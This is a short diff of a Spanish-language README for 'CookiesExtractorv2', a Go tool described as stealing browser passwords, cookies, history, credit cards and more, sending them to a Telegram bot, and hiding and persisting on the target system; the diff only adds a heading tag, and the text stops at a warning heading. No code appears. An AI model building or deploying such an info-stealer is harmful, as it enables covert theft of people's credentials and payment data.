@@ -1,4 +1,4 @@
-CookiesExtractorv2
+<h1>CookiesExtractorv2</h1>
 CookiesExtractorv2 es una herramienta desarrollada en Go diseñada para extraer datos sensibles de navegadores web (contraseñas, historial, cookies, marcadores, tarjetas de crédito, historial de descargas, localStorage y extensiones). A diferencia de la herramienta base, esta versión opera de forma discreta en segundo plano, recolecta los datos extraídos y los envía automáticamente a un bot de Telegram configurado. Soporta los navegadores más populares en Windows, macOS y Linux, e incluye mecanismos para su persistencia y ocultamiento en el sistema objetivo.
 
 Advertencia Importante:
